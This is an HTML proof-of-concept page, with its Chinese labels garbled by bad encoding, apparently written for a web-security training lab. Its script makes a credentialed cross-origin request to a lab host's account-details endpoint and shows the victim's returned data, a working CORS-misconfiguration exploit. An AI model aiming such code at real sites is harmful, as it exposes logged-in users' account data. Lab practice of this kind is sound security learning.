<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Lenovo æ¼æ´å¤ç° PoC</title>
</head>
<body>
  <h1>æµ‹è¯•è·¨åŸŸæ¼æ´ï¼ˆGETï¼‰</h1>
  <button id="test">æµ‹è¯•è¯·æ±‚</button>
  <pre id="result"></pre>

  <script>
    document.getElementById('test').onclick = function() {
      // ğŸ”¹ å¦‚æœä½ éœ€è¦ä¼ å‚ï¼Œå¯ä»¥åœ¨è¿™é‡Œæ‹¼æ¥ï¼Œæ¯”å¦‚ "?id=1"
      const url = "https://0aa80099037623af80f02bee00f60012.web-security-academy.net/accountDetails";

      fetch(url, {
        method: "GET",
        credentials: "include", // å¸¦ä¸Š Cookie
        // ğŸš« ä¸è¦ bodyï¼Œä¸è¦ headers
      })
      .then(response => {
        const contentType = response.headers.get("content-type");
        if (contentType && contentType.includes("application/json")) {
          return response.json();
        } else {
          return response.text();
        }
      })
      .then(data => {
        document.getElementById("result").textContent =
          typeof data === "string" ? data : JSON.stringify(data, null, 2);
        console.log("è¿”å›æ•°æ®ï¼š", data);
      })
      .catch(error => {
        document.getElementById("result").textContent = "è¯·æ±‚å¤±è´¥æˆ–è¢«æ‹¦æˆªï¼š" + error;
        console.error(error);
      });
    };
  </script>
</body>
</html>
